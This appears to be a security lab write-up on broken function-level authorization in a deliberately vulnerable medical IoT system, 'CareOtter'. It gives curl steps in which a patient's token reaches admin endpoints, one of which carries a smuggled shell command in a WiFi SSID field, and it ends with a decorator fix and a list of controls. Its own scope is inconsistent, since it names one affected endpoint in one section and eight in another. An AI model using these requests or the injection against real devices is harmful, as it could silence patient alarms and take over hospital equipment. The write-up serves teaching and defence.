---
id: API6:2023
title: Broken Function Level Authorization (BFLA)
category: API
status: DONE
severity: High
owasp: API5 — Broken Function Level Authorization
cwe: CWE-863 (Incorrect Authorization) / CWE-285
source_docs:
  - CareOtter_Test_Suite.md §API-06
  - "CareOtter_API.md Vulnerability Surface #8"
affected_components:
  - cloud_api/careotter/api_server/core/decorators.py
  - cloud_api/careotter/api_server/app.py
verified_date: 2026-05-02
---

# API6 — Broken Function Level Authorization (BFLA)

> **Source docs:** `CareOtter_Test_Suite.md` §API-06, `CareOtter_API.md` Vulnerability Surface #8  
> **OWASP:** API5 — Broken Function Level Authorization  
> **CWE:** CWE-863 (Incorrect Authorization) / CWE-285  
> **Severity:** High

---

## Why It Matters

Authentication answers the question *"Who are you?"* Authorization answers *"What are you allowed to do?"* CareOtter conflates the two. Once the Cloud API verifies that a JWT is cryptographically valid (correct signature, not expired), it assumes the bearer is authorized to invoke **any** protected REST endpoint. The `role` claim inside the token (`admin` vs `patient`) is never inspected for API routes, even though the same application enforces role separation perfectly in its HTML routes.

This is a classic **Broken Function Level Authorization (BFLA)** vulnerability: a low-privilege user (patient) can exercise high-privilege functions (administrative device management) with nothing more than their own legitimate credentials.

The impact is severe because the affected endpoints are not merely "informational." They include WiFi reconfiguration (which is vulnerable to shell injection via IGP 0x06), clinical threshold modification, service restart, and raw log exfiltration. A patient who simply wants to view their own vitals can, accidentally or maliciously, obtain the hospital WiFi PSK, silence all cardiac alarms, or obtain a remote root shell on the bedside monitor.

---

## Root Cause

The defect is architectural: the REST API and the Web UI use two completely different authorization decorators.

### 1. REST API decorator (`core/decorators.py`)

```python
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization', '')
        if not auth_header.startswith('Bearer '):
            return jsonify({'error': 'Token required', 'code': 'MISSING_TOKEN'}), 401

        token = auth_header.split(' ', 1)[1].strip()
        result = JWTService.decode_token(token)

        if not result['success']:
            return jsonify({'error': result['error'], 'code': 'INVALID_TOKEN'}), 401

        # MISSING: no inspection of result['payload']['role']
        return f(*args, **kwargs)
    return decorated
```

`@token_required` performs **authentication only**. It validates the JWT signature and expiration, then immediately calls the handler. It never reads the `role` claim from the decoded payload.

### 2. Web UI decorator (`core/decorators.py`)

```python
def web_admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        payload = _decode_and_validate()
        if not payload or payload.get('role') != 'admin':
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated
```

`@web_admin_required` performs **both authentication and authorization**. It extracts the payload and explicitly checks `role == 'admin'`. The HTML routes (`/admin/dashboard`, `/admin/network`, etc.) are therefore properly protected.

### 3. The gap

The  `threshold` administrative REST endpoint in `app.py` uses `@token_required`, not `@web_admin_required`:

- `POST /api/config/thresholds`

Because the REST layer lacks role enforcement, any user who can obtain a valid JWT — including a patient — can invoke this endpoint.

---

## Affected Endpoints

| Method | Endpoint                  | Admin Function                | Impact When Accessed by Patient                                       |
| ------ | ------------------------- | ----------------------------- | --------------------------------------------------------------------- |
| `POST` | `/api/config/thresholds`  | Set clinical alert thresholds | **Patient safety** — BPM/spO₂ alarms silenced (bpm_min=0, spo2_min=0) |


---

## Steps to Reproduce

**Precondition:** The system must be initialized (users exist). If the database is empty, run:

```bash
curl http://localhost:5002/initialize_iot
```

### Step 1 — Obtain a valid patient JWT

```bash
JWT_PATIENT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username":"patient","password":"patient123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "$JWT_PATIENT"
```

You can dinamically obtain the JWT Token by login in the cloud's login panel:
![[api-06-login-patient.png]]
Cloud starts showing some hints as "type" field with value "Bearer".  JWT Token is really located on browser's cookies.
![[Pasted image 20260515114444.png]]
### Step 2 — Inspect the token payload to confirm `role: patient`

```bash
echo -n "$JWT_PATIENT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

Expected output:
```json
{
  "username": "patient",
  "role": "patient",
  "exp": 1750000000,
  "iat": 1749996400
}
```

### Step 3 — Access admin endpoints with the patient token

**3A. WiFi PSK disclosure (information disclosure + BFLA):**

```bash
curl -s -H "Authorization: Bearer $JWT_PATIENT" \
  http://localhost:5002/api/network | python3 -m json.tool
```

**3B. Modify clinical thresholds (patient safety compromise):**

```bash
curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
  -H "Content-Type: application/json" \
  -d '{"bpm_min":0,"bpm_max":255,"spo2_min":0}' \
  http://localhost:5002/api/config/thresholds
```

**3C. Restart the medical sensor service (denial of clinical monitoring):**

```bash
curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
  -H "Content-Type: application/json" \
  -d '{"service":"medical-sensor"}' \
  http://localhost:5002/api/services/restart
```

**3D. Shell injection via WiFi configuration (privilege escalation to RCE):**

```bash
curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
  -H "Content-Type: application/json" \
  -d '{"ssid":"'\''; touch /tmp/patient_pwned #","password":"12345678"}' \
  http://localhost:5002/api/network/wifi
```

Then verify on the Raspberry Pi:
```bash
ls -la /tmp/patient_pwned
# File created by patient-owned token via "admin" endpoint
```

---

## Expected Result

All four requests above return `200 OK` (or `201`/`202`) instead of `403 Forbidden`. The patient token is accepted because `@token_required` validates the JWT signature and expiration but **never evaluates the `role` claim**.

Specifically:
- `/api/network` returns the full `raw` field containing `/etc/config/wireless` with the PSK in plaintext.
- `/api/config/thresholds` returns `THRESHOLDS_UPDATED` with BPM range `0–255` and SpO₂ minimum `0`, effectively disabling all clinical alerts.
- `/api/services/restart` returns `REBOOT_OK` and the medical sensor stops streaming.
- `/api/network/wifi` returns `WIFI_UPDATED` and the injected shell command executes on the Pi.

---

## How It Should Be

The REST layer should enforce role-based access control with the same rigor as the Web UI layer. The minimal fix is to introduce an `@admin_required` decorator for REST endpoints and apply it to all administrative functions:

```python
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        payload = _decode_and_validate()
        if not payload or payload.get('role') != 'admin':
            return jsonify({
                'error': 'Admin access required',
                'code': 'FORBIDDEN'
            }), 403
        return f(*args, **kwargs)
    return decorated
```

Then replace `@token_required` with `@admin_required` on:
- `GET /api/network`
- `POST /api/network/wifi`
- `POST /api/config/preferences`
- `POST /api/config/thresholds`
- `POST /api/services/restart`
- `GET /api/logs`
- `GET /api/devices`
- `POST /api/devices`

Endpoints that are legitimately accessible to both roles (e.g., `GET /api/vitals`, `GET /api/vitals/history`) can continue using `@token_required`, but should ideally use `@role_required('admin', 'patient')` for explicitness.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Authorization | Role-enforcing decorator on every admin REST endpoint | Prevent patients from invoking admin functions |
| Authorization | Deny-by-default — return `403` if role is missing or unexpected | Fail closed rather than fail open |
| Audit | Log every API call with `username`, `role`, `endpoint`, and `source_ip` | Enable forensic tracing of unauthorized access attempts |
| Testing | Automated BFLA test suite — patient JWT against every admin endpoint | Detect regressions where `@token_required` replaces `@admin_required` |

---

## Verification Checklist

- [ ] Patient JWT successfully authenticates at `/api/auth/login/patient`
- [ ] Patient JWT payload contains `"role": "patient"`
- [ ] `GET /api/network` with patient JWT returns `200 OK` and exposes `raw` field with WiFi PSK
- [ ] `POST /api/config/thresholds` with patient JWT returns `200 OK` (not `403`)
- [ ] `POST /api/services/restart` with patient JWT returns `200 OK` (not `403`)
- [ ] `POST /api/network/wifi` with patient JWT executes shell commands on the Pi
- [ ] Web UI `/admin/dashboard` with patient cookie redirects to login (confirms UI layer is protected)

---

## References

- `CareOtter_Test_Suite.md` §API-06
- `CareOtter_API.md` Vulnerability Surface #8
